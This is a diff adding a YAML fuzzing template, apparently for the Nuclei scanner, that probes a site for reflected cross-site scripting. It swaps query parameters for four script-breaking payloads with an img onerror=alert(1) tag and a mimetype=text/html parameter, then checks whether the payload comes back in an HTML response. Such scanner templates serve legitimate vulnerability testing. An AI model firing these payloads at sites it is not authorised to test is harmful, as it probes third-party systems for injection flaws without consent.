@@ -1,0 +1,39 @@
+id: xss-mimetype
+
+info:
+  name: XSS MimeType
+  author: reewardius
+  severity: medium
+  tags: fuzzing-xss,fuzzing-req
+  
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    payloads:
+      xss:
+        - "</script><script>\"><img src=123 onerror=alert(1)>&mimetype=text/html"
+        - "</script><script>\"><img src=123 onerror=alert(1)>&mimeType=text/html"
+        - "</script><script>\"><img src=123 onerror=alert(1)>&mime=text/html"
+        - "</script><script>\"><img src=123 onerror=alert(1)>&type=text/html"
+        
+    fuzzing:
+      - part: query
+        mode: multiple
+        type: replace
+        fuzz:
+          - "{{xss}}"
+          
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "<img src=123 onerror=alert(1)>"
+          
+      - type: word
+        part: header
+        words:
+          - text/html
